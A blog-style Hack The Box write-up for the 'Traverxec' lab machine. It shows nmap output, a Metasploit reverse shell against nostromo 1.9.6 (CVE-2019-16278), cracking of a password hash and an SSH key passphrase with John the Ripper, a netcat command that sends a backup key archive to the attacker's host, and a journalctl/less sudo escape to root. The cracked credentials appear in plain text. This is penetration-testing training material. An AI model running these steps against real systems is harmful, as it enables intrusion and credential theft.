---
layout: single
title: Traverxec - Hack The Box
excerpt: "Traverxec is an easy box that start with a custom vulnerable webserver with an unauthenticated RCE that we exploit to land an initial shell. After pivoting to another user by finding his SSH private key and cracking it, we get root through the less pager invoked by journalctl running as root through sudo."
date: 2020-04-11
classes: wide
header:
  teaser: <img src="/assets/images/traverxec/traverxec-logo.png">
  teaser_home_page: true
  icon: <img src="/assets/images/hackthebox.png">
categories:
  - hackthebox
tags:
  - nostromo
  - journalctl
  - gtfobins
---



## Summary

Traverxec is an easy box that start with a custom vulnerable webserver with an unauthenticated RCE that we exploit to land an initial shell. After pivoting to another user by finding his SSH private key and cracking it, we get root through the less pager invoked by journalctl running as root through sudo.

## Box Details

<img src="/assets/images/traverxec/traverxec-logo.png">

## Scanning

During the scanning stage, I usually perform port a scan to identify opened ports and then go further to perform service version scan which helps identify the versions of services running on the identified opened ports

### Nmap Output

`nmap` results from the port scan shows two ports opened. SSH on TCP 22 and HTTP on TCP 80

```
# nmap -Pn -n -sT -p- --min-rate 1000 -oA nmap/alltcp 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.15s latency).
Scanned at 2019-11-27 13:41:18 GMT for 131s
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Nov 27 13:43:29 2019 -- 1 IP address (1 host up) scanned in 131.48 seconds
```

The following `nmap` service version scan results shows the versions of the services running on the identified ports 22 and 80.

```
# nmap -sC -sV -p22,80 -oA nmap/services -vv 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2019-11-27 13:49:26 GMT for 17s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 27 13:49:43 2019 -- 1 IP address (1 host up) scanned in 17.68 seconds
```

Based on the OpenSSH version, this looks like Debian 10(Buster).

## Enumeration

### TCP Port 22

There's no published vulnerability on the version of OpenSSH running on port 22. I will skip this and probably come back to it if I ever find any credentails.

### TCP Port 80

I can see HTTP running on port 80 and the webserver is `nostromo 1.9.6`. Poking around the available website didn't show much.

<img src="/assets/images/traverxec/port-80-http.png">

I also performed directory brute-forcing using `gobuster` and `dirsearch` but didn't find anything interesting and hence decided to research further on this webserver version.

There is a Directory Traversal vulnerability `CVE-2019-16278` which leads to an unathorized Remote Command Execution. More informations can be found [here](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html). Also there's a metasploit module availablity which I can use to get a foothold in the server.

## Gaining Access

### Shell as www-data

We will use the module `exploit/multi/http/nostromo_code_exec` to gain shell access and the following is the setup:

<img src="/assets/images/traverxec/metasploit.png">

After running the module we have access as www-data:

```
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.15.200:4444
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.15.200:4444 -> 10.10.10.165:36028) at 2019-12-02 10:56:50 +0000
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$

```

## Lateral  Movement: www-data --> david

After checking the system and looking for the user.txt flag, I found a user david but couldn't list the contents of if home directory

<img src="/assets/images/traverxec/david-home.png">

For further enumeration, I run `LinEnum.sh` script with the thorough checks enabled and the most interesting thing that popped out of the logs was a password hash in the .htpasswd file and I used JohnTheRipper to crack the hash.

```
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

root@cyb3r:/HTB/machines/traverxec-10.10.10.165# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:47 32.57% (ETA: 23:24:05) 0g/s 101094p/s 101094c/s 101094C/s pan8oche..pan0846986097
Nowonly4me       (david)
1g 0:00:01:45 DONE (2019-11-30 23:23) 0.009506g/s 100563p/s 100563c/s 100563C/s Noyoudo..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I can tried using this cracked password for ssh but it didn't work hence further enumeration required.

```
# ssh david@10.10.10.165
david@10.10.10.165's password:
Permission denied, please try again.
david@10.10.10.165's password:
Permission denied, please try again.
david@10.10.10.165's password:
david@10.10.10.165: Permission denied (publickey,password)
```

As can be seen in the printout above, a publickey and password required. We need to dig deeper for the required key and this led me to check the nostromo configuration file. In the nhttpd.conf file, I found an interesting configuration where home directories(HOMEDIRS section) can be accessible via http


```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername        traverxec.htb
serverlisten        *
serveradmin        david@traverxec.htb
serverroot        /var/nostromo
servermimes        conf/mimes
docroot            /var/nostromo/htdocs
docindex        index.html

# LOGS [OPTIONAL]

logpid            logs/nhttpd.pid

# SETUID [RECOMMENDED]

user            www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess        .htaccess
htpasswd        /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons            /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs        /home
homedirs_public        public_www
www-data@traverxec:/var/nostromo/conf$
```

More information can be found from the webserver [manual](www.nazgul.ch/dev/nostromo_man.htmla)

```
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:
```

We can try to check user david's home directory to see if we can list the files: `http://10.10.10.165/~david`

<img src="/assets/images/traverxec/david-public.png">

Though the link was accessible, we couldn't find anything. Also we can see that access has been restricted to only `public_www` within the user david's home directory. We are able to list files in the `public_www` directory and noticed a backup ssh file. We will download that and check for the contents, possible SSH keys which can enable us to login to the SSH service.

```
www-data@traverxec:/usr/bin$ ls -larth /home/david/public_www/protected-file-area
<s -larth /home/david/public_www/protected-file-area
total 16K
drwxr-xr-x 3 david david 4.0K Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
drwxr-xr-x 2 david david 4.0K Oct 25 17:02 .
-rw-r--r-- 1 david david 1.9K Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/usr/bin$
```

We can use netcat to transfer the file from the server to our local machine. On attacker machine:

```
# nc -lvp 9001 > backup-ssh-identity-files.tgz
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:51542.
```

On server

```
www-data@traverxec:/usr/bin$ nc -w 3 10.10.15.200 9001 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
<w/protected-file-area/backup-ssh-identity-files.tgz
www-data@traverxec:/usr/bin$
```

Extracting the contents of the file and trying to login as user david didn't work as this unfortunately, required a passphrase. I attempted to you the password I cracked earlier but this failed. Hence the next action would be to use `ssh2john.py` on the private certificate file to generate a hash and try to crack the passphrase:

```
# ssh -i /root/traverxec/id_rsa david@10.10.10.165
Enter passphrase for key '/root/traverxec/id_rsa':
Enter passphrase for key '/root/traverxec/id_rsa':
Enter passphrase for key '/root/traverxec/id_rsa':
david@10.10.10.165's password:
Permission denied, please try again.
david@10.10.10.165's password:
Connection closed by 10.10.10.165 port 22
```

First, we generate a hash from the file and then use John to crack the hash:

```
root@cyb3r:/opt/JohnTheRipper/run# ./ssh2john.py /root/traverxec/id_rsa > ssh2john.txt
# john --wordlist=/usr/share/wordlists/rockyou.txt ssh2john.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (/root/traverxec/id_rsa)

1g 0:00:00:10 DONE (2019-12-01 22:04) 0.09852g/s 1412Kp/s 1412Kc/s 1412KC/sa6_123..*7¡Vamos!
Session completed
```

After this I then attempted the SSH login again using `hunter` as the passphrase and I successfully logged in and can get the user flag.

```
# ssh -i /root/traverxec/id_rsa david@10.10.10.165
Enter passphrase for key '/root/traverxec/id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sun Dec  1 17:09:07 2019 from 10.10.16.114
david@traverxec:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  bin  .profile  public_www  .ssh  user.txt
david@traverxec:~$ cat user.txt
7db0b4************************
david@traverxec:~$
```

## Privilege Escalation

After further enumeration with `LinEnum.sh` and `linux-smart-enumeration`, nothing really jumped out of the logs. However user david has a `bin` directory in the `/home` directory which had the following scripts:

```bash
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat

```

This script prints the last 5 log entries using the command `journalctl` when executed.

<img src="/assets/images/traverxec/journalctl.png">

Further research for any privilege escalation from [GTFOBINS](https://gtfobins.github.io/gtfobins/journalctl/) since the script is using the `sudo` command, I found the following:

"The `journalctl` command invokes the `less` command by default"

In order to exploit the less and journalctl command, we must force the log entries to be printed say one or two lines at a time so we can drop into less and then escape it using `!/bin/sh`. To do that we will resize the terminal window size and issue `!/bin/sh`in the resized window to gain our root shell:

<img src="/assets/images/traverxec/resized-terminal.png">

We can then have access to the root file.
